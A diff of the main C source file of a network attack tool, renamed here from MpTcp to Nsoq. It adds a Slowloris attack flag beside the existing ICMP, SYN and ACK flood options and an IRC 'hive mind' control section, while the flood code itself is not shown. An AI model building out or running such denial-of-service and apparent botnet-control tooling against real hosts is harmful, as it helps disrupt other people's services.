@@ -1,12 +1,12 @@
 /*......,,,,,,,.............................................................
 *
-* @@NAME:     MPTCP Project
-* @@VERSION:  1.0.9
-* @@DESC:     Main source file (this file is part of MpTcp tool).
+* @@NAME:     NSOQ Project
+* @@VERSION:  1.9.4
+* @@DESC:     Main source file (this file is part of Nsoq tool).
 * @@AUTHOR:   Felipe Ecker (Khun) <khun@hexcodes.org>
-* @@DATE:     15/11/2012 00:30:00
+* @@DATE:     18/10/2014 12:30:00
 * @@MANIFEST:
-*      Copyright (C) Felipe Ecker 2003-2013.
+*      Copyright (C) Felipe Ecker 2003-2014.
 *      You should have received a copy of the GNU General Public License 
 *      inside this program. Licensed under GPL 3
 *      If not, write to me an e-mail please. Thank you.
@@ -19,7 +19,7 @@
 
 static void __new( void ) __constructor__;
 static void __exit( void ) __destructor__;
-static bool __doExec( void * ) __used__;
+static bool __doExec( void * );
 
 extern const char *__doConsistency( void ) __call__;
 extern bool tcp( const char ** ) __call__;
@@ -45,16 +45,11 @@ extern bool irc( const char ** ) __call__;
 #endif
 
 #ifndef CORE_H
-   #error The core Mptcp properties is missing. Aborting..
-#endif
-
-#if defined(WEAK_GCC)
-   #warning "Found GCC < 4.4.x. MpTcp compilation \
-   without a good optimization. Upgrade GCC.."
+   #error The core Nsoq properties is missing. Aborting..
 #endif
 
 #define __info() do {                                                        \
-   show("\n\n\n\t\t  - TCP/IP Packet Manipulator and RSOI Handler -");       \
+   show("\n\n\t\t  - Network Security over a 'Q'rawler and RSOI Handler -");       \
    show("\n\n\tVer: %s - Released under GPL/GNU (Build Date: %s).", VERSION, DATEBUILD);\
    show("\n\tFinal Version compiled with libpthreads and libpcap (BSD).");   \
    show("\n\tMore includes that were used on compilation are available here too.");\
@@ -123,6 +118,7 @@ extern bool irc( const char ** ) __call__;
    show("\n  -B                  ICMP attack");                              \
    show("\n  -S                  TCP SYN attack");                           \
    show("\n  -K                  TCP ACK attack");                           \
+   show("\n  -Y                  SLOWLORIS based attack");                   \
    show("\n  [INFO] Use the -p <port> to set other port than 80 (Default 80)");\
    show("\n\n                          <RSOI - HIVE MIND> Options:");        \
    show("\n  -N <IRC Network>    IRC server to connect");                    \
@@ -211,35 +207,30 @@ int main( int argc, char **argv ) {
 
 #if defined(__BSD_SYSTEM__) && (defined(__NetBSD__) || defined(__OpenBSD__))
    show("System not supported.\n");
-   show("Avaiable systems are: Linux(all), FreeBSD || Darwin MACOS(IOS*).\n\n");
+   show("Avaiable systems are: Linux(all), FreeBSD, MAC OSX or Apple IOS* System.\n\n");
    sho("Exiting..\n");
    return ERR;
 #endif
-
-   if (getuid()) {
-      log("(I haven't the root login?). Require root privileges. \nExiting..\n\n");
-      return ERR;
-   }
 
    _START:
    if (argc < 2) {
       __spawn(*argv);
       show("\nDo you need more help or examples ??\n");
-      show("   -> Type: 'man mptcp' on terminal.\n");
-      show("   -> Look: /usr/share/doc/mptcp/mptcp.txt\n\n");
+      show("   -> Type: 'man nsoq' on terminal.\n");
+      show("   -> Look: /usr/share/doc/nsoq/nsoq.txt\n\n");
       return ERR;
    }
 
    const char *month = __getmonth(today);
 
-   log("\n\t\tStarting MpTcp %s at [%02d.%s.%02d - %02d:%02d:%02d]\n",VERSION,
+   log("\n\t\tStarting Nsoq %s at [%02d.%s.%02d - %02d:%02d:%02d]\n",VERSION,
    _t->tm_mday,month,_t->tm_year+1900,_t->tm_hour,_t->tm_min,_t->tm_sec);
 
-   log("\t\t\tMpTcp Project <www.hexcodes.org>\n\n");
+   log("\t\t\tNsoq Project <www.hexcodes.org>\n\n");
    srand(time(NULL));
 
    register unsigned opt, input, i = 0;
-   static char options[] = "UCWBSKbcDd:p:P:q:s:n:-:F:zt:i:I:M:T:ux:l:vH:h:Aa:f:N:L:G:Rr:e:";
+   static char options[] = "UCWBSKYbcDd:p:P:q:s:n:-:F:zt:i:I:M:T:ux:l:vH:h:Aa:f:N:L:G:Rr:e:";
 
    while((opt = getopt(argc,argv,options)) != -1)
       switch(opt) {
@@ -284,7 +275,7 @@ int main( int argc, char **argv ) {
             break;
          case 'v':
             __info();
-            break;
+            return 0;
          case '-':
             if (compare("help",optarg)) {
                argc = false;
@@ -459,6 +450,10 @@ int main( int argc, char **argv ) {
             pkt->tcpType |= TCP_ACK;
             pkt->tcpType |= TCP_PSH;
             break;
+         case 'Y':
+            pkt->__type__ |= __WEB_MODE__;
+            pkt->webType |= WEB_SLOW;
+            break;
 
          // IRC Stuff
          case 'N':
@@ -479,9 +474,16 @@ int main( int argc, char **argv ) {
             return ERR;
       }
 
-   register signed int free_blk;
-   if ( !(free_blk = __doExec("__START_MPTCP_")) ) pkt->numThreads = 0x00;
+   if (getuid()) {
+      log("Require root privileges. \nExiting..\n\n");
+      return ERR;
+   }
 
-   return free_blk;
+   if (! __doExec("__START_NSOQ_")) { 
+      pkt->numThreads = 0x00;
+      return ERR;
+   }
+
+   pthread_exit(0);
 }
 
